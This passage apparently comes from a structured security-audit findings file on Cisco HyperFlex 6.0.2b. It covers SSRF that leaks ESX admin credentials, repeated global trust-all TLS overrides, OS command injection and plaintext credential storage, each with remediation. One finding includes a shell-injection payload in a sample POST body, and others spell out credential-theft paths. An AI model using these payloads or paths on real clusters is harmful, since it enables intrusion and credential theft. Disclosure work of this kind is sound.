                "All HTTP methods (doGet, doPost both delegate to processRequest) are pre-authentication accessible."
            ),
            "ssrf_bytecode": (
                "StorvisorSupportBundle.processRequest(HttpServletRequest, HttpServletResponse): "
                "offset 22-25: request.getParameterValues('host') → String[] hostArray. "
                "offset 56-63: new HostCredentialsAccess() → ESX credentials from stmgr.getEsxCredential(). "
                "loop: offset 104=aload hostValue, offset 130=InvokeDynamic #1:makeConcatWithConstants(hostValue) "
                "→ url = 'https://<hostValue>/cgi-bin/vm-support.cgi?manifests=Springpath:Springpath' "
                "(constant pool #161 = 'https://\\u0001/cgi-bin/vm-support.cgi?manifests=Springpath:Springpath'). "
                "offset 149: WebDownloader.getStream(url, esxUser, esxPass) → InputStream. "
                "offset 157: FileUtils.copyStream(inputStream, zipOut) → response body."
            ),
            "credential_forwarding": (
                "WebDownloader.getStream(String url, String username, String password): "
                "offset 0-9: new WebDownloader$1(username, password) — anonymous Authenticator subclass "
                "that returns PasswordAuthentication(username, password) on getPasswordAuthentication(). "
                "offset 9: Authenticator.setDefault(authenticator) — JVM-WIDE default authenticator. "
                "offset 12-20: new URL(url).openStream() — fetches the attacker-controlled URL. "
                "When attacker's server responds with 401 WWW-Authenticate: Basic, "
                "the JVM Authenticator automatically provides ESX admin credentials in the retry request."
            ),
            "esxcredential_source": (
                "HostCredentialsAccess(): new ServiceAccess('localhost') → stmgr.getEsxCredential() via ThriftClient. "
                "EsxCredential.username and EsxCredential.password are VMware ESXi host credentials "
                "stored in the stmgr service (ServiceAccess.getEsxCredential() → StMgr$Client.getEsxCredential())."
            ),
            "auth_bypass_scope": (
                "No URL validation or allowlist on the 'host' parameter. "
                "Multiple hosts supported: request.getParameterValues() returns array; all values fetched. "
                "Response content of each fetched URL is streamed to attacker inside ZIP file (application/zip response). "
                "URL.openStream() follows HTTP redirects — attacker can chain to internal targets via redirect."
            ),
        },
        "impact": (
            "Any unauthenticated network-reachable caller can: "
            "(1) enumerate internal services by supplying internal hostnames/IPs as 'host' parameter values "
            "and reading the response streams; "
            "(2) exfiltrate ESX admin credentials by directing the server to an attacker-controlled HTTPS endpoint "
            "that challenges with 401 WWW-Authenticate: Basic — the JVM Authenticator responds with "
            "EsxCredential.username / EsxCredential.password automatically; "
            "(3) read content from any https:// URL reachable from the stCtlVM management interface. "
            "ESX admin credentials (VMware ESXi root or service account) provide full hypervisor control "
            "over all compute hosts in the HyperFlex domain."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Add authentication filter mapping for /st-support/* matching the other servlet patterns. "
            "Validate the 'host' parameter against a whitelist of known HyperFlex cluster node IPs. "
            "Do not forward ESX credentials via Authenticator.setDefault() — this sets a JVM-wide authenticator. "
            "Use a per-connection credential injection mechanism. "
            "Consider removing StorvisorSupportBundle entirely if InternalSupportBundle (/internalsupport/*) "
            "provides equivalent functionality with proper authentication."
        ),
    },
    "HX-F82": {
        "title": (
            "WebDownloader.trustAllHttpsCertificates() Called in Class Static Initializer — "
            "Global JVM TLS Certificate Validation Disabled in ROOT WAR at Class Load Time"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-295",
        "component": "ROOT-1.0.0 WAR / WebDownloader / WebDownloader$TrustAllManager / WebDownloader$2",
        "class": "TLS Certificate Validation Bypass — Second Global JVM Override in ROOT WAR, Triggered at Static Init",
        "confirmed": True,
        "evidence": {
            "static_init_bytecode": (
                "WebDownloader static initializer (ROOT-1.0.0/WEB-INF/classes/.../WebDownloader.class): "
                "offset 0: invokestatic trustAllHttpsCertificates() — called at class load, before any instance. "
                "offset 3-10: new WebDownloader$2(), HttpsURLConnection.setDefaultHostnameVerifier(verifier) — "
                "JVM-wide hostname verifier override at static init."
            ),
            "trust_all_method_bytecode": (
                "WebDownloader.trustAllHttpsCertificates(): "
                "offset 7-14: new WebDownloader$TrustAllManager() — anonymous X509TrustManager. "
                "offset 15-17: SSLContext.getInstance('SSL'). "
                "offset 21-25: SSLContext.init(null, TrustManager[]{WebDownloader$TrustAllManager}, null). "
                "offset 28-32: HttpsURLConnection.setDefaultSSLSocketFactory(sslCtx.getSocketFactory()) — JVM-WIDE."
            ),
            "trust_manager_noop": (
                "WebDownloader$TrustAllManager implements javax.net.ssl.X509TrustManager: "
                "checkServerTrusted() → return (offset 0: return). "
                "checkClientTrusted() → return (offset 0: return). "
                "getAcceptedIssuers() → null (aconst_null; areturn)."
            ),
            "hostname_verifier_noop": (
                "WebDownloader$2 implements javax.net.ssl.HostnameVerifier: "
                "verify(String, SSLSession) → iconst_1; ireturn (always true)."
            ),
            "scope_and_activation": (
                "Difference from HX-F78: ROOT WAR WebDownloader overrides are set in the class static "
                "initializer, not in an instance method. Any class loader that loads WebDownloader (e.g., "
                "StorvisorSupportBundle or GenerationThread initializing it) triggers the global override. "
                "StorvisorSupportBundle.doGet/doPost → processRequest → WebDownloader.getStream() "
                "loads the class and fires the static init. "
                "Once set, all HttpsURLConnection in the ROOT WAR JVM have no TLS validation for the lifetime "
                "of the class (which is the lifetime of the JVM unless the class loader is discarded)."
            ),
        },
        "impact": (
            "Every HTTPS connection from the ROOT WAR JVM (management UI backend, "
            "stmgr Thrift, vCenter, upgrade download, support bundle fetch) "
            "accepts any certificate without chain or hostname validation from the point WebDownloader is first loaded. "
            "Combined with HX-F81: an attacker directing SSRF to an attacker-controlled HTTPS host "
            "benefits from the trust-all override — the server will follow the attacker's TLS endpoint "
            "without any certificate error, making MITM on all HTTPS channels in the ROOT WAR JVM trivial. "
            "This is a second independent instance of the same vulnerability class as HX-F78, "
            "in a separate WAR and JVM process."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove WebDownloader.trustAllHttpsCertificates() and the class static initializer that calls it. "
            "Use a dedicated SSLContext pinned to the HyperFlex internal CA for ESXi host connections. "
            "The SSLContext should be per-connection or per-host, not set via setDefaultSSLSocketFactory(). "
            "Class-level static initializers are especially dangerous for security-affecting state: "
            "once the class is loaded, the bypass cannot be reverted from application code."
        ),
    },
    "HX-F83": {
        "title": (
            "HxSupportSvcClient.trustAll() Globally Disables TLS Certificate Validation in "
            "slservice-1.0.0 WAR JVM via HttpsURLConnection.setDefaultSSLSocketFactory()"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-295",
        "component": "slservice-1.0.0 WAR / HxSupportSvcClient / trustAll() / HxSupportSvcClient$1 / HxSupportSvcClient$2",
        "class": "TLS Certificate Validation Bypass — Third Global JVM Override in Smart Licensing WAR",
        "confirmed": True,
        "evidence": {
            "openClient_bytecode": (
                "HxSupportSvcClient.openClient(): "
                "offset 1: invokevirtual trustAll() — called before transport creation. "
                "offset 5: new THttpClient('https://localhost/hxsupportsvc'). "
                "offset 17: getRootSessionID(). "
                "offset 28: THttpClient.setCustomHeader('X-RootSessionID', rootSessionId). "
                "offset 34: new TBinaryProtocol(transport)."
            ),
            "trustAll_bytecode": (
                "HxSupportSvcClient.trustAll() (private): "
                "Creates SSLContext with HxSupportSvcClient$1 (no-op X509TrustManager). "
                "Calls HttpsURLConnection.setDefaultSSLSocketFactory(sslCtx.getSocketFactory()) — JVM-WIDE. "
                "Calls HttpsURLConnection.setDefaultHostnameVerifier(new HxSupportSvcClient$2()) — JVM-WIDE."
            ),
            "trust_manager_noop": (
                "HxSupportSvcClient$1 implements X509TrustManager: "
                "checkServerTrusted() → return (offset 0). getAcceptedIssuers() → null. "
                "HxSupportSvcClient$2 implements HostnameVerifier: verify() → iconst_1 (always true)."
            ),
            "service_context": (
                "HxSupportSvcClient connects to HxSupportSvc Thrift service at https://localhost/hxsupportsvc. "
                "Methods: slRegisterSync (Cisco Smart Licensing registration), slDeregister, "
                "slGetClusterLicenseTier, slGetAllStatus. "
                "Smart Licensing registration transmits license token data — "
                "after trustAll() sets global factory, any HTTPS connection in slservice-1.0.0 JVM loses cert validation."
            ),
        },
        "impact": (
            "Third independent instance of the HttpsURLConnection global TLS bypass pattern (HX-F78, HX-F82). "
            "All HTTPS connections from the slservice-1.0.0 JVM process — including Smart Licensing calls to "
            "Cisco's license server — are subject to TLS MITM after HxSupportSvcClient is first instantiated. "
            "License token data and cluster identity information transmitted to the license server can be "
            "intercepted and modified by a network-adjacent attacker without triggering any certificate error."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove trustAll(). Replace with a per-connection SSLContext configured with the appropriate "
            "CA bundle for the hxsupportsvc localhost endpoint. "
            "For Smart Licensing outbound calls, pin to Cisco's license server CA. "
            "Do not call setDefaultSSLSocketFactory/setDefaultHostnameVerifier. "
            "This is the third instance of the same pattern — address all four instances systematically "
            "with a shared utility class that enforces per-connection, CA-pinned SSL contexts."
        ),
    },
    "HX-F84": {
        "title": (
            "UpgradeSvcAccess.trustAll() Globally Disables TLS Certificate Validation in "
            "hxupgrade-1.0.0 WAR JVM via HttpsURLConnection.setDefaultSSLSocketFactory()"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-295",
        "component": "hxupgrade-1.0.0 WAR / UpgradeSvcAccess / trustAll() / UpgradeSvcAccess$1 / UpgradeSvcAccess$2",
        "class": "TLS Certificate Validation Bypass — Fourth Global JVM Override in Upgrade Service WAR",
        "confirmed": True,
        "evidence": {
            "openClientConnection_bytecode": (
                "UpgradeSvcAccess.openClientConnection(String url, HttpHeaders headers): "
                "offset 11: invokestatic trustAll() — called at connection open. "
                "offset 15-25: new THttpClient(InvokeDynamic url concat) — HTTPS THttpClient. "
                "offset 36-58: extracts Authorization header from HttpHeaders, "
                "sets THttpClient.setCustomHeader('Authorization', authHeader)."
            ),
            "trustAll_bytecode": (
                "UpgradeSvcAccess.trustAll() (public static): "
                "Creates SSLContext with UpgradeSvcAccess$1 (no-op X509TrustManager). "
                "offset 38: HttpsURLConnection.setDefaultSSLSocketFactory(sslCtx.getSocketFactory()) — JVM-WIDE. "
                "offset 50: HttpsURLConnection.setDefaultHostnameVerifier(new UpgradeSvcAccess$2()) — JVM-WIDE. "
                "NOTE: trustAll() is public static — callable from any context in the hxupgrade WAR."
            ),
            "trust_manager_noop": (
                "UpgradeSvcAccess$1 implements X509TrustManager: "
                "checkServerTrusted() → return. getAcceptedIssuers() → null. "
                "UpgradeSvcAccess$2 implements HostnameVerifier: verify() → true."
            ),
            "service_context": (
                "UpgradeSvcAccess connects to StUpgradeSvc Thrift service. "
                "Methods: upgradeService(HxClusterUpgradeThriftPayload), checkClusterUpgradeValidations, "
                "checkUpgradeService, getClusterVersionDetails, getUcsHfpVersions. "
                "trustAll() is invoked on every openClientConnection() call. "
                "The upgrade payload contains cluster topology and version data — "
                "MITM against the upgrade Thrift channel could redirect upgrade source or corrupt cluster state."
            ),
        },
        "impact": (
            "Fourth independent instance of the HttpsURLConnection global TLS bypass pattern (HX-F78, HX-F82, HX-F83). "
            "All HTTPS connections from the hxupgrade-1.0.0 JVM after UpgradeSvcAccess is first instantiated "
            "lose TLS certificate validation. "
            "UpgradeSvcAccess.trustAll() is public static — it is also callable directly by any code in "
            "the hxupgrade WAR class space. "
            "Upgrade operations (firmware upgrades, cluster expansion validation, UCS HFP version checks) "
            "are subject to MITM without any certificate error, enabling supply chain interference "
            "in the firmware update path."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove trustAll(). Scope the SSLContext to a per-connection factory pinned to the upgrade "
            "service's CA. trustAll() being public static amplifies risk — remove the method entirely "
            "rather than making it private. "
            "All four instances (HX-F78, HX-F82, HX-F83, HX-F84) share the same root cause: "
            "use of HttpsURLConnection.setDefaultSSLSocketFactory/setDefaultHostnameVerifier for a "
            "convenience disable. Address systematically with a shared HttpClientFactory that "
            "always returns CA-pinned, per-connection SSL contexts."
        ),
    },
    "HX-F85": {
        "title": (
            "HxSecuritySvcMgrClient.trustAll() Globally Disables TLS Certificate Validation in "
            "securityservice-1.0.0 WAR JVM via HttpsURLConnection.setDefaultSSLSocketFactory()"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-295",
        "component": "securityservice-1.0.0 WAR / HxSecuritySvcMgrClient / trustAll() / HxSecuritySvcMgrClient$1 / HxSecuritySvcMgrClient$2",
        "class": "TLS Certificate Validation Bypass — Fifth Global JVM Override in Security Service WAR",
        "confirmed": True,
        "evidence": {
            "trustAll_bytecode": (
                "HxSecuritySvcMgrClient.trustAll() (private): "
                "Creates TrustManager[] array with HxSecuritySvcMgrClient$1 (no-op X509TrustManager). "
                "offset 39: invokestatic HttpsURLConnection.setDefaultSSLSocketFactory(sslCtx.getSocketFactory()) — JVM-WIDE. "
                "offset 52: invokestatic HttpsURLConnection.setDefaultHostnameVerifier(new HxSecuritySvcMgrClient$2()) — JVM-WIDE. "
                "$1.checkServerTrusted() → return; $1.getAcceptedIssuers() → null. "
                "$2.verify() → iconst_1 (always true)."
            ),
            "openClientHttp_bytecode": (
                "openClientHttp(String host): "
                "offset 1: invokevirtual trustAll() — first instruction before transport construction. "
                "offset 9-15: new THttpClient('http://localhost:8055') when host is null. "
                "offset 25-35: new THttpClient(InvokeDynamic 'http://\\u0001:8055') when host provided. "
                "NOTE: Thrift transport is plain HTTP to port 8055, not HTTPS. "
                "trustAll() side-effect globally disables TLS validation for all other HTTPS connections "
                "in the securityservice WAR JVM."
            ),
            "thrift_service": "hxSecuritySvcMgr — port 8055; THttpClient (HTTP)",
            "service_scope": (
                "HxSecuritySvcMgrClient methods exposed to the JVM bypass: "
                "backupDareKeys(THxSoftwareEncryptionBackupConfig), "
                "restoreDareKeys(THxSoftwareEncryptionRestoreConfig), "
                "checkSoftwareEncryptionCapable(String), "
                "updateNtpServers(List<HxNtpServer>, String), clearNtpServers(String), "
                "updateAuthBanner(String), applySTIG(String), changePassword(String, String, String), "
                "updateSshConcurrentLoginLimit(int), updateSshIdleTimeout(int), updateSshBrokenTimeout(int). "
                "Any HTTPS call made by this WAR after first openClientHttp() is unvalidated."
            ),
        },
        "impact": (
            "Fifth independent instance of the HttpsURLConnection global TLS bypass pattern "
            "(HX-F78, HX-F82, HX-F83, HX-F84). "
            "The securityservice WAR manages DARE encryption keys, NTP servers, SSH policy, STIG application, "
            "password policy, and auth banners — the highest-sensitivity management plane in HyperFlex. "
            "All HTTPS connections from this JVM after first client instantiation lose certificate validation, "
            "exposing DARE key backup/restore operations and credential-bearing management traffic to MITM. "
            "Unlike HX-F84 where trustAll() was public static, here it is private but still invoked on "
            "every openClientHttp() call, meaning it re-runs the global override each time a new client opens."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove trustAll(). The Thrift transport to hxSecuritySvcMgr is HTTP (port 8055, localhost-only); "
            "the global SSL bypass serves no purpose for this transport. "
            "Scope any needed SSL context to external HTTPS calls using per-connection SSLSocketFactory. "
            "This is the fifth instance of the same pattern across five WARs — "
            "address systemically (see HX-F78 remediation)."
        ),
    },
    "HX-F86": {
        "title": (
            "SupportbundleApiServiceImpl generateAndDeliverSupportBundle 'manifestFile' Parameter "
            "Unsanitized Interpolation into Shell Command Enables OS Command Injection on All Cluster Nodes"
        ),
        "severity": "CRITICAL",
        "cvss": "9.9",
        "cwe": "CWE-78",
        "component": (
            "supportservice-1.0.0 WAR / SupportbundleApiServiceImpl / "
            "generateAndDeliverSupportBundle(AsupCliConfiguration) / "
            "GenerationThread.run() / HxSupportSvcClient.executeCmd()"
        ),
        "class": "OS Command Injection — manifestFile Interpolated into Shell Command Sent to All Cluster VMs",
        "confirmed": True,
        "evidence": {
            "injection_point": (
                "AsupCliConfiguration.getManifestFile() → local var 6 in generateAndDeliverSupportBundle. "
                "Constant pool #770/#771: 'asupcli post --type custom-asup --manifestfile \\u0001' — "
                "makeConcatWithConstants at offset 544 interpolates manifestFile directly into command string. "
                "No validation, no character filtering: only null and length > 0 checks (offsets 531-539). "
                "Trigger: type == 'custom-asup' AND manifestFile != null AND len > 0."
            ),
            "execution_chain": (
                "generateAndDeliverSupportBundle offset 581-603: "
                "new GenerationThread(this, cmd, type, genStatus, config).start(). "
                "GenerationThread.run() offset 175-180: "
                "invokevirtual HxSupportSvcClient.executeCmd(this.cmd, nodeList). "
                "HxSupportSvcClient.executeCmd() offset 14-20: "
                "invokevirtual HxSupportSvc$Client.runCmdInAllVm(String cmd, List<String> args) — Thrift RPC."
            ),
            "shell_execution_proof": (
                "GenerationThread.run() offset 87: ldc 'ps aux | grep \\'[a]supcli generate --type\\'' — "
                "pipe and shell quoting syntax proves hxSupportSvc daemon executes commands via shell. "
                "Constant pool #762/#763: 'nohup asupcli generate --type \\u0001 > /dev/null 2>&1 &' — "
                "nohup, stdout redirection, and background execution operator are shell-only constructs."
            ),
            "cluster_wide_impact": (
                "HxSupportSvc$Client.runCmdInAllVm() — method name 'InAllVm' indicates command is "
                "dispatched to all virtual machines in the cluster via the hxSupportSvc Thrift service. "
                "A single authenticated request injects commands on every node simultaneously."
            ),
            "payload_example": (
                "POST /v1/supportbundle body: "
                "{\"action\":\"generate\", \"type\":\"custom-asup\", \"manifestFile\":\"x; id; #\"} "
                "→ shell executes: asupcli post --type custom-asup --manifestfile x; id; # "
                "→ 'id' runs as the hxSupportSvc service user on every cluster node."
            ),
        },
        "impact": (
            "Authenticated attacker with any valid HyperFlex management credential can inject arbitrary OS "
            "commands that execute on ALL cluster nodes simultaneously. "
            "The hxSupportSvc daemon runs with sufficient privilege to access cluster state and credentials. "
            "Shell metacharacters (;, &&, |, $(), backtick) in the manifestFile parameter are not filtered "
            "before insertion into the command string, and the hxSupportSvc daemon executes via shell "
            "(confirmed by pipe/nohup/redirection usage in adjacent code paths). "
            "Authentication is required but any valid management user (not just admin) can trigger this endpoint."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Validate manifestFile against an allow-list of permitted characters before interpolation "
            "(alphanumeric, hyphen, dot, forward slash only). "
            "Alternatively, pass manifestFile as a separate Thrift argument rather than interpolating "
            "it into a command string — the executeCmd signature accepts List<String> args for this purpose. "
            "Do not construct shell command strings from user input; pass parameters as positional arguments "
            "to a structured Thrift call that the daemon executes without shell interpretation."
        ),
    },
    "HX-F87": {
        "title": (
            "supportservice-1.0.0 WAR Contains Three Independent trustAll() Implementations "
            "Each Globally Disabling TLS Certificate Validation via HttpsURLConnection JVM Override"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-295",
        "component": (
            "supportservice-1.0.0 WAR / HxSupportSvcClient / HxSvcMgrClient / StMgrClient — "
            "three independent trustAll() implementations, each with inner-class $1 (X509TrustManager) "
            "and $2 (HostnameVerifier) no-op bypass"
        ),
        "class": "TLS Certificate Validation Bypass — Three Concurrent Global JVM Overrides in Support Service WAR",
        "confirmed": True,
        "evidence": {
            "HxSupportSvcClient": (
                "trustAll() offsets 39/52: HttpsURLConnection.setDefaultSSLSocketFactory + setDefaultHostnameVerifier JVM-WIDE. "
                "openClient() offset 1: invokevirtual trustAll() before THttpClient('https://localhost/hxsupportsvc')."
            ),
            "HxSvcMgrClient": (
                "trustAll() offsets 39/52: same global JVM override pattern. "
                "openClientHttp() offset 1: invokevirtual trustAll() before THttpClient('http://\\u0001:9341'). "
                "Thrift transport to hxSvcMgr on port 9341 is plain HTTP — bypass has no purpose for this transport "
                "but globally disables TLS validation for all other HTTPS connections in the WAR JVM."
            ),
            "StMgrClient": (
                "trustAll() offsets 39/52: same global JVM override pattern. "
                "openClient() offset 1: invokevirtual trustAll() before THttpClient('https://localhost/stmgr'). "
                "This is the sixth instance of the StMgrClient pattern (HX-F78 in encryption WAR, "
                "this instance in supportservice WAR)."
            ),
            "cumulative_scope": (
                "Each time any of the three client classes opens a connection, it re-executes the global JVM "
                "SSLSocketFactory and HostnameVerifier overrides. In the supportservice JVM, whichever client "
                "is instantiated first sets the global state; all subsequent clients reinforce it. "
                "All HTTPS connections from the supportservice JVM — including any external call-home, "
                "certificate fetch, or vendor ASUP upload channel — lose TLS validation."
            ),
        },
        "impact": (
            "Three independent trustAll() implementations in the support service WAR compound the global JVM "
            "TLS bypass. The support service handles ASUP (automated support protocol) uploads, support bundle "
            "delivery, and remote support configuration — all outbound channels that may carry system state "
            "or telemetry to external endpoints. MITM against any of these channels is undetectable. "
            "This is the sixth (StMgrClient), seventh (HxSupportSvcClient), and eighth (HxSvcMgrClient) "
            "independent instances of this pattern across the HyperFlex WAR deployment."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove all three trustAll() implementations. "
            "HxSvcMgrClient connects to HTTP (port 9341) — no SSL override is needed at all. "
            "HxSupportSvcClient and StMgrClient connect to HTTPS localhost; "
            "use a pinned CA-specific SSLSocketFactory scoped to the connection, not the JVM default. "
            "This is the sixth, seventh, and eighth instance of the same root cause (see HX-F78 remediation)."
        ),
    },
    "HX-F88": {
        "title": (
            "iscsi-1.0.0 WAR Contains Four Independent trustAll() Implementations "
            "Each Globally Disabling TLS Certificate Validation via HttpsURLConnection JVM Override"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-295",
        "component": (
            "iscsi-1.0.0 WAR / HxIscsiMgrClient / HxSvcMgrClient / StMgrClient / HxIscsiCloneMgrClient — "
            "four independent trustAll() implementations, each with inner-class $1 (X509TrustManager) "
            "and $2 (HostnameVerifier) no-op bypass"
        ),
        "class": "TLS Certificate Validation Bypass — Four Concurrent Global JVM Overrides in iSCSI Service WAR",
        "confirmed": True,
        "evidence": {
            "HxIscsiMgrClient": (
                "trustAll() offset 39: invokestatic HttpsURLConnection.setDefaultSSLSocketFactory — JVM-WIDE. "
                "offset 52: invokestatic HttpsURLConnection.setDefaultHostnameVerifier — JVM-WIDE. "
                "openClientHttp() connects to hxIscsiMgr at localhost:9342 via THttpClient."
            ),
            "HxSvcMgrClient": (
                "trustAll() offsets 39/52: same global JVM override pattern. "
                "openClientHttp() connects to hxSvcMgr (sysmgmt.stSSOMgrHost) via THttpClient."
            ),
            "StMgrClient": (
                "trustAll() offsets 39/52: same global JVM override pattern. "
                "openClientHttp() connects to stMgr at localhost:9333 via THttpClient. "
                "Seventh StMgrClient instance of this pattern across HyperFlex WARs."
            ),
            "HxIscsiCloneMgrClient": (
                "trustAll() offsets 39/52: same global JVM override pattern. "
                "openClientHttp() connects to hxCloneSvcMgr at localhost:9347 via THttpClient."
            ),
            "application_conf": (
                "Ports confirmed: hxIscsiMgrPort=9342, stMgrPort=9333, hxCloneSvcMgrPort=9347. "
                "All targets are localhost Thrift services. "
                "trustAll() is called before every openClientHttp()/openClient() invocation."
            ),
        },
        "impact": (
            "Four independent trustAll() implementations in the iSCSI WAR — the largest concentration "
            "in any single HyperFlex WAR analyzed. iSCSI handles storage target provisioning, initiator "
            "group management, LUN configuration, and clone operations — all storage-plane control paths. "
            "MITM against any HTTPS connection from this JVM (including any certificate retrieval, "
            "external notification, or management plane call-home) is undetectable. "
            "This is the ninth through twelfth independent instance of this pattern across the HyperFlex WAR fleet "
            "(HX-F78, HX-F82, HX-F83, HX-F84, HX-F85, HX-F87 enumerate the prior eight instances)."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove all four trustAll() implementations. "
            "Use a pinned CA-specific SSLSocketFactory scoped per-connection, not the JVM default. "
            "This is the ninth through twelfth instance of the same root cause across the HyperFlex WAR fleet. "
            "A single shared fix — a correctly-scoped TrustManager factory utility — should replace all 12 instances "
            "across encryption, ROOT, slservice, hxupgrade, securityservice, supportservice, and iscsi WARs. "
            "See HX-F78 remediation for the authoritative fix template."
        ),
    },
    "HX-F89": {
        "title": (
            "SedUcsmReadonlyUserMgr Stores Plaintext UCSM Credentials "
            "(ucsmHostName + username + password) in ZooKeeper with OPEN_ACL_UNSAFE"
        ),
        "severity": "HIGH",
        "cvss": "7.5",
        "cwe": "CWE-312",
        "component": (
            "stmgr / SedUcsmReadonlyUserMgr / StClusterEncryptionUcsmReadonlyUser Thrift struct / "
            "ZooKeeper ServiceDiscovery at /storvisor/ basePath with OPEN_ACL_UNSAFE"
        ),
        "class": "Cleartext Storage of Sensitive Information in World-Readable ZooKeeper Path",
        "confirmed": True,
        "evidence": {
            "credential_struct": (
                "StClusterEncryptionUcsmReadonlyUser Thrift struct fields (bytecode-verified): "
                "ucsmHostName:String, username:String, password:String. "
                "All three fields are public instance members. "
                "Serialized via TJSONProtocol (plaintext JSON) by SedUcsmReadonlyUserMgrSerializer."
            ),
            "zk_path": (
                "SedUcsmReadonlyUserMgr.init() registers via Curator ServiceDiscovery. "
                "basePath = StMgrImpl.BASE_PATH = '/storvisor'. "
                "Service discovery path: /storvisor/SedUcsmReadonlyUserMgr/instances/<uuid>. "
                "Payload = JSON-serialized StClusterEncryptionUcsmReadonlyUser including plaintext password."
            ),
            "acl_context": (
                "ZooKeeper cluster uses OPEN_ACL_UNSAFE (Id='world', Perms=ALL). "
                "See HX-F55 (ZK OPEN_ACL_UNSAFE). "
                "Any process with TCP access to ZK port 2181 can read /storvisor/... without credentials."
            ),
            "credential_role": (
                "These are UCSM (UCS Manager) readonly credentials used for "
                "drive encryption key management (SED — Self-Encrypting Drive). "
                "Access to UCSM management plane from these credentials enables reading drive "
                "encryption policy configuration and potentially key management parameters."
            ),
        },
        "impact": (
            "Plaintext UCSM management plane credentials stored in world-readable ZooKeeper. "
            "Any process on the HyperFlex cluster — or any host with network access to ZK port 2181 "
            "that is not blocked by iptables rules — can retrieve UCSM hostname, username, and password "
            "without authentication. UCSM access via these credentials enables inspection of drive "
            "encryption policy configuration and may expose additional management plane attack surface. "
            "Compounded by HX-F55 (OPEN_ACL_UNSAFE on all ZK nodes) and HX-F69 (auth permanently disabled)."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Store UCSM credentials in the StorvisorKeystore (AES-encrypted JKS at "
            "/etc/hyperflex_shadow — see HX-F41) rather than in ZooKeeper. "
            "If ZooKeeper storage is required, encrypt the credential payload before storing "
            "and decrypt only at retrieval time; do not store plaintext JSON. "
            "Additionally, restrict ZooKeeper access to localhost or cluster-internal IPs only "
            "and apply proper ACLs (see HX-F55 remediation). "
            "Rotate UCSM readonly credentials after any disclosure event."
        ),
    },
    "HX-F90": {
        "title": (
            "StDeployImpl.getEncodedPassword() Uses Base64 Only (Not Encryption) — "
            "Six Infrastructure Credential Types Written to /tmp/virtInfoXXXXXX.json "
            "and Passed as CLI Arguments During Cluster Deployment"
        ),
        "severity": "HIGH",
        "cvss": "7.1",
        "cwe": "CWE-312",
        "component": (
            "stmgr / StDeployImpl / getEncodedPassword / setupScriptConfigurationFiles / "
            "setupVirtInfoConfigFile / postInstallControllerVMScript — deployment path credential handling"
        ),
        "class": "Cleartext Storage of Sensitive Information — Base64 Mistaken for Encryption in Deployment Pipeline",
        "confirmed": True,
        "evidence": {
            "getEncodedPassword_impl": (
                "StDeployImpl.getEncodedPassword(String): "
                "Code: aload_1; invokestatic Base64.encodeBase64String(input.getBytes()); areturn. "
                "Method performs Base64.encodeBase64String(input.getBytes()) — reversible encoding, not encryption. "
                "Used at 18+ call sites across setupScriptConfigurationFiles, setupVirtInfoConfigFile, "
                "and postInstallControllerVMScript lambda functions."
            ),
            "credentials_encoded": (
                "Six credential fields from VirtClusterParams processed via getEncodedPassword: "
                "VirtClusterParams.esxPassword (ESXi host password, offset 80), "
                "VirtClusterParams.vCenterPassword (offset 98), "
                "VirtClusterParams.ctlvmPassword (offset 116), "
                "VirtClusterParams.ucsmPassword (offset 139), "
                "VirtClusterParams.cimcPassword (offset 162), "
                "VirtClusterParams.esxNewPassword (offset 185). "
                "Hyper-V branch additionally encodes: ctlvmPassword (offset 625), "
                "HxHypervDetails.localAdminPassword (offset 652), "
                "ActiveDirectoryDetails.domainAdminPassword (offset 674), "
                "ActiveDirectoryDetails.hxAdminPassword (offset 687), "
                "ActiveDirectoryDetails.cdUserPassword (offset 700)."
            ),
            "file_write": (
                "$anonfun$setupScriptConfigurationFiles$1 / $anonfun$setupVirtInfoConfigFile$1: "
                "Base64-replaced VirtClusterParams copy serialized via JsonThriftSerializer.toString() "
                "and written to File.createTempFile('virtInfo', '.json') via FileUtils.writeStringToFile(). "
                "NetworkSettings JSON written to File.createTempFile('networkSettings', '.json'). "
                "Both files in JVM default temp directory (typically /tmp). "
                "Files deleted after use via deleteScriptConfigurationFiles -> deleteWithRetry -> "
                "FileUtils.deleteQuietly(), but deletion is best-effort (exception before cleanup leaves files)."
            ),
            "cli_argument": (
                "$anonfun$postInstallControllerVMScript$7: constructs command-line list "
                "[script_path, '--json-config-file-networking', <networkSettings_file_path>, "
                "'--ctlvmPassword', getEncodedPassword(ctlvmPassword), '--workFlowType', <type>] "
                "and executes via scala.sys.process.stringSeqToProcess().lines(). "
                "Base64-encoded ctlvmPassword visible in /proc/<pid>/cmdline and audit logs during execution."
            ),
            "sanitize_context": (
                "sanitizeIfNotDebugMode(VirtClusterParams) called before debug log at offset 34 "
                "in setupVirtInfoConfigFile$1 — plaintext redacted from debug logs only. "
                "The JSON file write and CLI invocation use the Base64 version regardless of log level."
            ),
        },
        "impact": (
            "All six infrastructure credential types (ESXi, vCenter, CTLVM, UCSM, CIMC, ESXi-new) "
            "are written in Base64 form to temporary files in /tmp during cluster deployment. "
            "Base64 is trivially reversible: `echo <value> | base64 -d` recovers plaintext. "
            "CTLVM password additionally exposed as command-line argument visible in /proc/<pid>/cmdline "
            "for the duration of the deployment script execution. "
            "Deletion is best-effort — exception path leaves virtInfo*.json and networkSettings*.json on disk. "
            "Any local process running as any user can read /tmp files (world-readable by default) and "
            "decode all credentials. Post-exploitation combined with HX-F55 (ZK open ACLs) and "
            "HX-F89 (UCSM creds in ZK) enables full cluster credential harvest in a single pass."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
